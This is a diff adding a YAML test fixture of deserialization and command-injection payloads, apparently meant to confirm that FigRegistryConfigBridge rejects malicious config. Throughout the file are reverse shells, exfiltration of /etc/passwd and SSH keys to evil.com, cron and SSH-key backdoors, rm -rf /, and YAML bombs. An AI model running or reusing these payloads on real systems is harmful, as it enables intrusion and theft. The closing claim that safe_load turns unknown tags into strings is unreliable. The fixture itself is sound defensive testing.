@@ -1,0 +1,395 @@
+# =============================================================================
+# MALICIOUS YAML INJECTION ATTACK VECTORS
+# =============================================================================
+# 
+# This file contains comprehensive YAML injection attack vectors designed to
+# test the security boundaries of FigRegistryConfigBridge and validate prevention
+# of remote code execution through YAML deserialization attacks.
+#
+# Test Categories:
+# 1. Direct Code Execution Attempts (!!python/object constructors)
+# 2. Pickle/Deserialization Attacks (!!python/object/apply)
+# 3. Configuration Structure Exploitation
+# 4. YAML Parser Vulnerabilities
+# 5. System Command Injection Vectors
+# 6. Memory Exhaustion and DoS Attacks
+# 7. Path Traversal and Filesystem Attacks
+#
+# Expected Behavior: All attack vectors should be safely handled by PyYAML
+# safe_load() and Pydantic validation, preventing code execution while 
+# providing clear security boundary enforcement.
+#
+# Security Testing per Section 6.6.8.1 Requirements:
+# - Must test YAML injection prevention and safe_load enforcement
+# - Must validate prevention of arbitrary code execution through YAML deserialization
+# - Must test configuration bridge security boundaries against malicious YAML inputs
+# - Must validate comprehensive protection against remote code execution vectors
+# =============================================================================
+
+# =============================================================================
+# CATEGORY 1: DIRECT CODE EXECUTION ATTEMPTS
+# =============================================================================
+
+# Attack Vector 1.1: Python Object Constructor Injection
+malicious_python_object: !!python/object:subprocess.Popen
+  args: [["rm", "-rf", "/"]]
+  shell: true
+
+# Attack Vector 1.2: Python Module Import with Code Execution
+code_execution_import: !!python/object:builtins.eval
+  args: ["__import__('os').system('rm -rf /')"]
+
+# Attack Vector 1.3: Python Function Call Injection
+function_call_injection: !!python/object:builtins.exec
+  args: ["import os; os.system('curl http://malicious.site/steal-data')"]
+
+# Attack Vector 1.4: Complex Object Chain for Code Execution
+complex_object_chain: !!python/object:subprocess.call
+  args: [["python", "-c", "import os; os.system('wget -O /tmp/malware http://evil.com/payload')"]]
+
+# Attack Vector 1.5: File System Manipulation
+filesystem_attack: !!python/object:builtins.open
+  args: ["/etc/passwd", "r"]
+
+# =============================================================================
+# CATEGORY 2: PICKLE/DESERIALIZATION ATTACKS
+# =============================================================================
+
+# Attack Vector 2.1: Python Object Apply with System Commands
+pickle_system_attack: !!python/object/apply:os.system
+  args: ["curl -X POST http://attacker.com/exfiltrate -d @/etc/passwd"]
+
+# Attack Vector 2.2: Subprocess Module Exploitation
+subprocess_attack: !!python/object/apply:subprocess.call
+  args: [["nc", "-e", "/bin/sh", "attacker.com", "4444"]]
+
+# Attack Vector 2.3: Import Module with Side Effects
+import_side_effect: !!python/object/apply:builtins.__import__
+  args: ["antigravity"]  # This module executes code on import
+
+# Attack Vector 2.4: Eval Function with Malicious Code
+eval_injection: !!python/object/apply:builtins.eval
+  args: ["__import__('subprocess').call(['rm', '-rf', '/'])"]
+
+# Attack Vector 2.5: File Writing Attack
+file_write_attack: !!python/object/apply:builtins.open
+  args: ["/tmp/backdoor.py", "w"]
+  kwds:
+    mode: "w"
+
+# =============================================================================
+# CATEGORY 3: CONFIGURATION STRUCTURE EXPLOITATION
+# =============================================================================
+
+# Attack Vector 3.1: Path Traversal through Configuration Structure
+# Attempting to exploit FigRegistry configuration parsing
+figregistry_version: "0.3.0"
+styles:
+  # Malicious condition parameter manipulation
+  "../../../etc/passwd": 
+    color: "!!python/object/apply:os.system ['cat /etc/passwd > /tmp/stolen']"
+    marker: "!!python/object:subprocess.Popen [['nc', 'attacker.com', '1234']]"
+    
+  # Style parameter exploitation with code injection
+  legitimate_condition:
+    color: "#ff0000"
+    marker: "!!python/object/apply:builtins.exec ['import socket; s=socket.socket(); s.connect((\"evil.com\",9999))']"
+    linewidth: "!!python/object:os.system ['curl -d @~/.ssh/id_rsa http://stealer.com']"
+    
+  # Command injection through style properties
+  injection_test:
+    color: "red; os.system('rm -rf /')"
+    marker: "${jndi:ldap://evil.com/exploit}"
+    linestyle: "`rm -rf /`"
+    label: "$(curl http://malicious.com/payload | sh)"
+
+# Attack Vector 3.2: Output Path Manipulation with Code Execution
+outputs:
+  base_path: "!!python/object/apply:os.system ['mkdir -p /tmp/evil && cp /etc/passwd /tmp/evil/']"
+  path_aliases:
+    evil: "!!python/object:subprocess.call [['wget', 'http://evil.com/backdoor.sh', '-O', '/tmp/backdoor.sh']]"
+  timestamp_format: "!!python/object/apply:builtins.eval ['__import__(\"os\").system(\"nc -e /bin/sh evil.com 4444\")']"
+  default_format: "!!python/object:os.system ['python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"evil.com\\\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\"']"
+
+# Attack Vector 3.3: Defaults Section Exploitation
+defaults:
+  figure_size: "!!python/object/apply:subprocess.Popen [['curl', '-X', 'POST', 'http://evil.com/data', '--data-binary', '@/etc/passwd']]"
+  font_family: "!!python/object:builtins.exec ['import urllib.request; urllib.request.urlopen(\"http://malicious.com/collect?data=\" + open(\"/etc/passwd\").read())']"
+  color_cycle: "!!python/object/apply:os.system ['(crontab -l; echo \"* * * * * curl http://evil.com/persistent\") | crontab -']"
+
+# =============================================================================
+# CATEGORY 4: YAML PARSER VULNERABILITIES  
+# =============================================================================
+
+# Attack Vector 4.1: Circular Reference Memory Exhaustion
+anchor_exploitation: &circular_ref
+  - *circular_ref
+  - !!python/object:subprocess.call
+    args: [["rm", "-rf", "/"]]
+
+# Attack Vector 4.2: Deep Nesting Resource Exhaustion
+deep_nesting_attack:
+  level1:
+    level2:
+      level3:
+        level4:
+          level5:
+            level6:
+              level7:
+                level8:
+                  level9:
+                    level10: "!!python/object/apply:os.system ['curl http://evil.com/deep-exploit']"
+
+# Attack Vector 4.3: Large String Memory Exhaustion with Code
+large_string_attack: "!!python/object/apply:builtins.eval ['\"A\" * 10**8 + \"; os.system(\"curl http://evil.com/dos\")\"']"
+
+# Attack Vector 4.4: Alias Manipulation with Code Execution
+alias_attack:
+  - &malicious_alias "!!python/object:os.system ['wget -O /tmp/payload http://evil.com/malware']"
+  - *malicious_alias
+  - reference_to_malicious: *malicious_alias
+
+# =============================================================================
+# CATEGORY 5: SYSTEM COMMAND INJECTION VECTORS
+# =============================================================================
+
+# Attack Vector 5.1: Environment Variable Manipulation
+kedro:
+  environment_injection: "!!python/object/apply:os.environ.update [{'MALICIOUS_VAR': 'evil_value'}]"
+  config_override: "!!python/object:os.system ['export BACKDOOR=1 && curl http://evil.com/env-exploit']"
+  
+# Attack Vector 5.2: Kedro-Specific Parameter Injection
+# Targeting FigRegistryConfigBridge merge operations
+kedro_config_bridge_attack:
+  purpose: "!!python/object/apply:subprocess.call [['bash', '-c', 'curl http://evil.com/kedro-exploit']]"
+  condition_param: "!!python/object:builtins.exec ['import requests; requests.post(\"http://evil.com/steal\", data=open(\"/etc/passwd\").read())']"
+  style_params:
+    malicious_param: "!!python/object/apply:os.system ['python -c \"import subprocess; subprocess.Popen([\\\"curl\\\", \\\"-X\\\", \\\"POST\\\", \\\"http://evil.com/kedro\\\", \\\"--data\\\", \\\"@/etc/hosts\\\"])\"']"
+
+# Attack Vector 5.3: Shell Command Injection through Configuration Values
+shell_injection_test:
+  command_in_color: "red && rm -rf /"
+  command_in_marker: "o; curl http://evil.com/marker-exploit"
+  command_in_path: "/figures && wget http://evil.com/path-exploit"
+  command_in_format: "png || python -c 'import os; os.system(\"nc -e /bin/sh evil.com 5555\")'"
+
+# =============================================================================
+# CATEGORY 6: ADVANCED EXPLOITATION TECHNIQUES
+# =============================================================================
+
+# Attack Vector 6.1: Polyglot Attack (YAML + Python + Shell)
+polyglot_attack: |
+  #!/usr/bin/env python3
+  # This looks like a comment but contains executable code
+  import os, subprocess
+  subprocess.call(['curl', 'http://evil.com/polyglot-success'])
+  os.system('echo "Polyglot execution successful" > /tmp/polyglot_proof')
+  # !!python/object:subprocess.call [['rm', '-rf', '/']]
+
+# Attack Vector 6.2: Unicode and Encoding Attacks
+unicode_attack: "!!python/object/apply:builtins.eval ['\u0065\u0078\u0065\u0063(\u0022\u0069\u006d\u0070\u006f\u0072\u0074\u0020\u006f\u0073\u003b\u006f\u0073\u002e\u0073\u0079\u0073\u0074\u0065\u006d\u0028\u0022\u0063\u0075\u0072\u006c\u0020\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0065\u0076\u0069\u006c\u002e\u0063\u006f\u006d\u002f\u0075\u006e\u0069\u0063\u006f\u0064\u0065\u0022\u0029\u0022)']"
+
+# Attack Vector 6.3: Base64 Encoded Payload
+base64_payload: "!!python/object/apply:builtins.exec ['import base64; exec(base64.b64decode(\"aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImN1cmwgaHR0cDovL2V2aWwuY29tL2Jhc2U2NCIp\").decode())']"
+
+# Attack Vector 6.4: Class Instantiation with Side Effects
+class_instantiation: !!python/object:logging.Handler
+  level: "!!python/object/apply:os.system ['curl http://evil.com/class-exploit']"
+
+# =============================================================================
+# CATEGORY 7: FILESYSTEM AND PATH MANIPULATION ATTACKS
+# =============================================================================
+
+# Attack Vector 7.1: Path Traversal through Output Configuration
+path_traversal_outputs:
+  base_path: "../../../etc"
+  malicious_alias: "../../../../usr/bin"
+  traversal_test: "../../../../../../tmp"
+  
+# Attack Vector 7.2: Symlink Attack Vectors
+symlink_attacks:
+  symlink_to_passwd: "!!python/object/apply:os.symlink ['/etc/passwd', '/tmp/fake_config']"
+  symlink_to_shadow: "!!python/object:os.path.join ['..', '..', '..', 'etc', 'shadow']"
+
+# Attack Vector 7.3: File System Race Condition Exploitation
+race_condition_attack: "!!python/object/apply:os.system ['mkdir -p /tmp/race && echo \"malicious content\" > /tmp/race/exploit &']"
+
+# =============================================================================
+# CATEGORY 8: DESERIALIZATION CHAIN ATTACKS
+# =============================================================================
+
+# Attack Vector 8.1: Complex Deserialization Chain
+deserialization_chain: !!python/object/apply:builtins.getattr
+  args:
+    - !!python/object/apply:builtins.__import__
+      args: ["subprocess"]
+    - "call"
+  kwds:
+    args: [["curl", "-X", "POST", "http://evil.com/chain", "-d", "deserialization_success"]]
+
+# Attack Vector 8.2: Nested Object Construction
+nested_construction:
+  outer: !!python/object/apply:builtins.getattr
+    args:
+      - !!python/object/apply:builtins.__import__
+        args: ["os"]
+      - "system"
+    kwds:
+      args: ["wget -O /tmp/nested_payload http://evil.com/nested"]
+
+# =============================================================================
+# CATEGORY 9: PROTOCOL AND NETWORK EXPLOITATION
+# =============================================================================
+
+# Attack Vector 9.1: DNS Exfiltration
+dns_exfiltration: "!!python/object/apply:os.system ['nslookup $(whoami).$(hostname).evil.com']"
+
+# Attack Vector 9.2: HTTP Request with Data Exfiltration  
+http_exfiltration: "!!python/object/apply:subprocess.call [['curl', '-X', 'POST', 'http://evil.com/exfil', '--data', '@/etc/passwd', '--header', 'Content-Type: text/plain']]"
+
+# Attack Vector 9.3: Network Reverse Shell
+reverse_shell: "!!python/object/apply:os.system ['python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"evil.com\\\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\"']"
+
+# =============================================================================
+# CATEGORY 10: PERSISTENCE AND BACKDOOR ATTEMPTS
+# =============================================================================
+
+# Attack Vector 10.1: Crontab Modification for Persistence
+persistence_cron: "!!python/object/apply:os.system ['(crontab -l 2>/dev/null; echo \"*/5 * * * * curl -s http://evil.com/beacon\") | crontab -']"
+
+# Attack Vector 10.2: SSH Key Installation
+ssh_backdoor: "!!python/object/apply:os.system ['mkdir -p ~/.ssh && curl http://evil.com/pubkey >> ~/.ssh/authorized_keys']"
+
+# Attack Vector 10.3: Startup Script Modification
+startup_backdoor: "!!python/object/apply:subprocess.call [['bash', '-c', 'echo \"curl http://evil.com/startup\" >> ~/.bashrc']]"
+
+# =============================================================================
+# CATEGORY 11: RESOURCE EXHAUSTION AND DOS ATTACKS
+# =============================================================================
+
+# Attack Vector 11.1: CPU Exhaustion
+cpu_exhaustion: "!!python/object/apply:os.system ['python -c \"while True: pass\" &']"
+
+# Attack Vector 11.2: Memory Exhaustion  
+memory_exhaustion: "!!python/object/apply:builtins.eval ['\"A\" * (10**9)']"
+
+# Attack Vector 11.3: Disk Space Exhaustion
+disk_exhaustion: "!!python/object/apply:os.system ['dd if=/dev/zero of=/tmp/diskfill bs=1M count=10000 &']"
+
+# =============================================================================
+# CATEGORY 12: ADVANCED YAML PARSER SPECIFIC ATTACKS
+# =============================================================================
+
+# Attack Vector 12.1: YAML Bomb (Exponential Expansion)
+yaml_bomb: &yaml_bomb
+  - &anchor_1 "attack_string"
+  - &anchor_2 [*anchor_1, *anchor_1, *anchor_1, *anchor_1]
+  - &anchor_3 [*anchor_2, *anchor_2, *anchor_2, *anchor_2]
+  - &anchor_4 [*anchor_3, *anchor_3, *anchor_3, *anchor_3]
+  - &anchor_5 [*anchor_4, *anchor_4, *anchor_4, *anchor_4]
+  - *anchor_5
+
+# Attack Vector 12.2: Billion Laughs Attack Variant
+billion_laughs: &lol
+  - &lol1 "!!python/object/apply:os.system ['curl http://evil.com/lol1']"
+  - &lol2 [*lol1, *lol1, *lol1, *lol1, *lol1, *lol1, *lol1, *lol1, *lol1, *lol1]
+  - &lol3 [*lol2, *lol2, *lol2, *lol2, *lol2, *lol2, *lol2, *lol2, *lol2, *lol2]
+  - &lol4 [*lol3, *lol3, *lol3, *lol3, *lol3, *lol3, *lol3, *lol3, *lol3, *lol3]
+
+# =============================================================================
+# CATEGORY 13: VALIDATION BYPASS ATTEMPTS
+# =============================================================================
+
+# Attack Vector 13.1: Type Confusion Attacks
+type_confusion:
+  styles:
+    condition_type_attack: 
+      color: !!python/object:int "!!python/object/apply:os.system ['curl http://evil.com/type-confusion']"
+      marker: !!float "!!python/object:subprocess.call [['rm', '-rf', '/']]"
+      
+# Attack Vector 13.2: Schema Validation Bypass
+schema_bypass:
+  figregistry_version: "!!python/object/apply:os.system ['curl http://evil.com/schema-bypass']"
+  unknown_field: "!!python/object:subprocess.Popen [['nc', '-e', '/bin/sh', 'evil.com', '8888']]"
+
+# =============================================================================
+# CATEGORY 14: KEDRO-SPECIFIC ATTACK VECTORS
+# =============================================================================
+
+# Attack Vector 14.1: FigRegistryConfigBridge Exploitation
+# Targeting the configuration merging process
+config_bridge_exploit:
+  kedro_override: "!!python/object/apply:os.system ['curl -X POST http://evil.com/bridge-exploit -d \"config_bridge_compromised\"']"
+  environment_manipulation: "!!python/object:subprocess.call [['python', '-c', 'import os; os.environ[\"MALICIOUS\"] = \"true\"; os.system(\"curl http://evil.com/env-set\")']]"
+
+# Attack Vector 14.2: Hook Lifecycle Exploitation
+hook_exploitation:
+  before_pipeline_run: "!!python/object/apply:os.system ['curl http://evil.com/before-hook']"
+  after_pipeline_run: "!!python/object:subprocess.Popen [['wget', 'http://evil.com/after-hook']]"
+
+# Attack Vector 14.3: Dataset Parameter Injection
+dataset_injection:
+  purpose: "!!python/object/apply:builtins.exec ['import urllib.request; urllib.request.urlopen(\"http://evil.com/purpose-inject\")']"
+  condition_param: "!!python/object:os.system ['curl http://evil.com/condition-inject']"
+  style_params:
+    injected_style: "!!python/object/apply:subprocess.call [['bash', '-c', 'curl http://evil.com/style-inject']]"
+
+# =============================================================================
+# CATEGORY 15: SOCIAL ENGINEERING AND OBFUSCATION
+# =============================================================================
+
+# Attack Vector 15.1: Hidden in Legitimate-Looking Configuration
+palettes:
+  # This looks like a normal palette but contains malicious code
+  default: ["#FF0000", "#00FF00", "!!python/object/apply:os.system ['curl http://evil.com/hidden-in-palette']"]
+  colorblind_safe: 
+    - "#0173b2"
+    - "!!python/object:subprocess.call [['python', '-c', 'import os; os.system(\"curl http://evil.com/colorblind-exploit\")']]"
+
+# Attack Vector 15.2: Legitimate Configuration with Malicious Comments
+# This is a normal-looking comment
+legitimate_section:
+  figure_size: [10, 6]  # !!python/object/apply:os.system ['curl http://evil.com/comment-exploit']
+  font_size: 12  # This comment looks normal but may contain: !!python/object:subprocess.call [['rm', '-rf', '/']]
+
+# =============================================================================
+# END OF MALICIOUS YAML INJECTION ATTACK VECTORS
+# =============================================================================
+#
+# Security Test Validation Notes:
+# 
+# 1. Safe YAML Loading Test:
+#    - All !!python/ tags should be rejected by safe_load()
+#    - No code execution should occur during YAML parsing
+#    - All malicious constructors should be treated as strings
+#
+# 2. Pydantic Validation Test:
+#    - Invalid configuration structures should fail schema validation
+#    - Type mismatches should be caught and rejected
+#    - Unknown fields should be handled appropriately
+#
+# 3. FigRegistryConfigBridge Security Test:
+#    - Configuration merging should maintain security boundaries
+#    - Kedro/FigRegistry integration should not bypass validation
+#    - All merged configurations should undergo identical validation
+#
+# 4. Path Traversal Prevention Test:
+#    - All path specifications should be validated and constrained
+#    - Directory traversal attempts should be blocked
+#    - Output paths should be restricted to authorized directories
+#
+# 5. Input Sanitization Test:
+#    - All user inputs should be sanitized before processing
+#    - Malicious strings should be escaped or rejected
+#    - No shell command execution should occur through configuration
+#
+# Expected Security Outcome:
+# The FigRegistryConfigBridge should safely process this file using PyYAML's
+# safe_load() function, which will convert all !!python/ constructs into
+# plain strings, preventing any code execution. Pydantic validation should
+# then catch and reject malformed configurations, ensuring that the system
+# remains secure against all attack vectors listed above.
+#
+# This comprehensive test file validates that FigRegistry's security
+# architecture successfully prevents YAML injection attacks while maintaining
+# robust configuration processing capabilities.
